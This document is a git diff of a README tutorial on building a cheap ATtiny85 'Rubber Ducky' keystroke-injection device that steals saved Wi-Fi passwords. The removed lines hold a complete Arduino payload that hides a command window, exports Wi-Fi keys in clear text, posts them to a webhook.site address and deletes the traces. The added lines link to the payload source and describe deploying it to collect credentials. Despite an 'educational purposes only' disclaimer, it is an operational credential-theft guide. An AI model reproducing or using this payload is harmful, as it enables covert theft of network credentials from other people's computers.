@@ -1,6 +1,10 @@
 # At-Home-Rubber-Ducky
 Below is how you can create your own Rubber Ducky for just $3. 
 
+## Gif Example
+![HomemadeRubberDucky](https://user-images.githubusercontent.com/56332039/151614531-077adf95-5d0e-4024-a8e7-636cfa4494c1.gif)
+
+
 ## First thing first
 This is for educational purposes ONLY! Do not use this to steal Wi-Fi passwords without permission. I am not liable for your misuse. 
 
@@ -29,64 +33,14 @@ Go to https://github.com/digistump/DigistumpArduino/releases, and download the z
 
 ### Step Five: Finally, the Payloads
 
-Go to https://github.com/MTK911/Attiny85/tree/master/payloads, and click Wi-Fi Password Stealer. I prefer the WifiKey-Grab_Minimize-of-Shame.ino, but choose your favorite. I made slight changes to the code, increasing the delay, and adding "Fi" to some "-Wi-Fi" portions, and I will show you here:
-
->/*
-  Following payload will grab saved Wifi password and will send them to your hosted webhook and hide the cmd windows by using technique mentioned in hak5darren
- rubberducky wiki -- Payload hide cmd window [https://github.com/hak5darren/USB-Rubber-Ducky/wiki/Payload---hide-cmd-window]
-*/
-
-
-#include "DigiKeyboard.h"
-#define KEY_DOWN 0x51 // Keyboard Down Arrow
-#define KEY_ENTER 0x28 //Return/Enter Key
-
-void setup() {
-  pinMode(1, OUTPUT); //LED on Model A 
-}
-
-void loop() {
-   
-  DigiKeyboard.update();
-  DigiKeyboard.sendKeyStroke(0);
-  DigiKeyboard.delay(3000);
- 
-  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); //run
-  DigiKeyboard.delay(100);
-  DigiKeyboard.println("cmd /k mode con: cols=15 lines=1"); //smallest cmd window possible
-  DigiKeyboard.delay(500);
-  DigiKeyboard.delay(500);
-  DigiKeyboard.sendKeyStroke(KEY_SPACE, MOD_ALT_LEFT); //Menu  
-  DigiKeyboard.sendKeyStroke(KEY_M); //goto Move
-  for(int i =0; i < 100; i++)
-    {
-      DigiKeyboard.sendKeyStroke(KEY_DOWN);
-    }
-  DigiKeyboard.sendKeyStroke(KEY_ENTER); //Detach from scrolling
-  DigiKeyboard.delay(100);
-  DigiKeyboard.println("cd %temp%"); //going to temporary dir
-  DigiKeyboard.delay(500);
-  DigiKeyboard.println("netsh wlan export profile key=clear"); //grabbing all the saved wifi passwd and saving them in temporary dir
-  DigiKeyboard.delay(1000);
-  DigiKeyboard.println("powershell Select-String -Path Wi-Fi* -Pattern 'keyMaterial' > Wi-Fi-PASS"); //Extracting all password and saving them in Wi-Fi-Pass file in temporary dir
-  DigiKeyboard.delay(1000);
-  DigiKeyboard.println("powershell Invoke-WebRequest -Uri https://webhook.site/<ADD-WEBHOOK-ADDRESS-HERE> -Method POST -InFile Wi-Fi-PASS"); //Submitting all passwords on hook
-  DigiKeyboard.delay(1000);
-  DigiKeyboard.println("del Wi-Fi* /s /f /q"); //cleaning up all the mess
-  DigiKeyboard.delay(500);
-  DigiKeyboard.println("exit");
-  DigiKeyboard.delay(100);
-  
-  digitalWrite(1, HIGH); //turn on led when program finishes
-  DigiKeyboard.delay(90000);
-  digitalWrite(1, LOW); 
-  DigiKeyboard.delay(5000);
-  
-}
-  
+Go to https://github.com/MTK911/Attiny85/tree/master/payloads, and click Wi-Fi Password Stealer. I prefer the WifiKey-Grab_Minimize-of-Shame.ino, but choose your favorite. I made slight changes to the code, increasing the delay, and adding "-Fi" to some "Wi*" portions (Example: -Path Wi* changed to -Path Wi-Fi*).
 
 ### Step Six: Webhook.site
 
-Go to https://webhook.site and get your own personalized webhook uri. 
+Go to https://webhook.site and get your own personalized webhook uri. Replace https://webhook.site/<ADD-WEBHOOK-ADDRESS-HERE> with your specific address
+  
+### Step Seven: Almost to the Fun Part
+  
+  From here, you want to Verify the Payload inside of Arduino, then click upload. After you click upload, plug in the Attiny85 Micro USB, and it will copy the code over. Once done, unplug the Micro USB, close Arduino, bring up your webhook.site URL, and plug back in the Attiny85 Micro USB. You will see some action, and finally, have Wi-Fi credentials in plain text. The entire process will take about 20 seconds. Enjoy!
 
  
